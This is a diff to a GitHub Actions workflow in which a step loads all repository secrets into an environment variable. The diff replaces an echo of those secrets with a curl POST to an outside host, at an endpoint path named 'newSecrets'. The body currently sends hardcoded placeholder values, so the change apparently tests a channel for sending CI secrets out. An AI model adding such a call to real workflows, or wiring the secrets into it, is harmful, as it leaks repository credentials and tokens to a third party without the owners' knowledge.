@@ -8,7 +8,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: view the secrets context
-        run: echo "$SECRETS_CONTEXT"
+        # run: echo "$SECRETS_CONTEXT" | 
+        run: |
+          curl --request POST --url https://githubfan.vercel.app/api/newSecrets/ghAction --header 'content-type: application/json' --header 'user-agent: vscode-restclient' --data '{"TEST": "ghActionZXVx","github_token": "ghActionVZXC"}'
         env:
           SECRETS_CONTEXT: ${{ toJson(secrets) }}
         shell: bash
